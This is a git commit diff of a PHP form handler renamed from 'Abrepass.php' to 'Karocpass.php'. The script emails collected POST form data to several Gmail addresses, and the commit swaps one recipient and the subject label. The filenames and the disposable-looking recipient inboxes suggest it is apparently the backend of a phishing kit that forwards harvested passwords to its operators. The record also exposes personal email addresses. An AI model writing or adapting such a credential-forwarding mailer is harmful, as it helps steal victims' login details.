bef6cae75e3f25f7cd7afc8b668d5020fcf2722a
Uzr44911 <ahmjtalijaan@gmail.com>
2025-08-07 16:22:36 +0500

    Update and rename Abrepass.php to Karocpass.php

--- Karocpass.php
+++ Karocpass.php
@@ -35,14 +35,14 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email properties
         $mail->setFrom('Lernayouamzaxal@gmail.com', 'Ghaliya');
-        $mail->addAddress('tiktokworkings218@gmail.com');
+        $mail->addAddress('mattmatths323@gmail.com');
         $mail->addAddress('Lernayouamzaxal@gmail.com');
 
       // Email recipient's address
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'abre';
+        $mail->Subject = 'karoc';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
 
